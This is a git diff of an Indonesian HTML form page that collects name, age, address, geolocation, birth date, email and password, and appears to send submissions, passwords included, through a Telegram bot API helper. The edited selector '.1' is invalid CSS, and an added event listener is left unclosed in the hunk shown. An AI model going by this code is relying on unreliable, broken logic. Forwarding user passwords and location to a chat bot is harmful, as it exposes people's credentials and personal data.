@@ -16,33 +16,33 @@
     <label>Opsional</label>
     <br>
     <form id="form">
-      <label data-id="2">Nama :</label>
+      <label>Nama :</label>
       <br>
-      <input data-id="1" id="nama" type="name" placeholder="Masukkan Nama" required></input>
+      <input class="1" id="nama" type="name" placeholder="Masukkan Nama" required></input>
       <br>
-      <label data-id="2">Umur :</label>
+      <label>Umur :</label>
       <br>
-      <input id="umur" type="number" data-id="1" placeholder="Umur" required></input>
+      <input class="1" type="number" data-id="1" placeholder="Umur" required></input>
       <br>
-      <label data-id="2">Alamat :</label>
+      <label>Alamat :</label>
       <br>
-      <textarea id="lokasi" data-id="1" placeholder="Masukkan Alamat / Dapatkan Lokasi Langsung" required></textarea>
+      <textarea class="1" id="lokasi" placeholder="Masukkan Alamat / Dapatkan Lokasi Langsung" required></textarea>
       <br>
       <button onclick="getLocation()">Dapatkan Lokasi</button>
       <br>
-      <label data-id="2">Tanggal Lahir :</label>
+      <label>Tanggal Lahir :</label>
       <br>
-      <input id="tgl_lahir" type="date" data-id="1" required></input>
+      <input class="1" id="tgl_lahir" type="date" required></input>
       <br>
-      <label data-id="2">Email :</label>
+      <label>Email :</label>
       <br>
-      <input id="email" data-id="1" type="email" placeholder="Masukkan Email" required></input>
+      <input class="1" id="email" type="email" placeholder="Masukkan Email" required></input>
       <br>
-      <label data-id="2">Kata Sandi :</label>
+      <label>Kata Sandi :</label>
       <br>
-      <input id="kata_sandi" type="password" data-id="1" placeholder="Masukkan Kata Sandi" required></input>
+      <input class="1" id="kata_sandi" type="password" placeholder="Masukkan Kata Sandi" required></input>
       <br>
-      <input type="submit" onclick="sendText()"></input>
+      <input id="submit" type="submit" onclick="sendText()"></input>
     
     </form>
     <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
@@ -53,17 +53,17 @@ var req = document.getElementById('req');
 
 opt.addEventListener("click", function(event) {
   req.checked = false
-var a = document.querySelector('form[data-id="1"]');
+var a = document.querySelector('.1');
   a.removeAttribute('required')
-var b = document.querySelector('label[data-id="2"]');
+var b = document.querySelector('form > label');
   b.innerText = b.value + " Opsional";
 });
 
 req.addEventListener("click", function(event) {
     opt.checked = false;
-  var a = document.querySelector('form[data-id="1"]');
+  var a = document.querySelector('.1');
   a.setAttribute('required', '')
-var b = document.querySelector('label[data-id="2"]');
+var b = document.querySelector('form > label');
   b.innerText = b.value + " Wajib";
 });
 
@@ -79,7 +79,9 @@ async function telegramRequest(method, data) {
     console.error(error);
   }
 }
-
+document.getElementById('submit').addEventListener("click", function() {
+  let datesubmit;
+  
 const form = document.getElementById('form');
 let tgl_lahir; // Deklarasikan variabel tgl_lahir di luar event listener
 
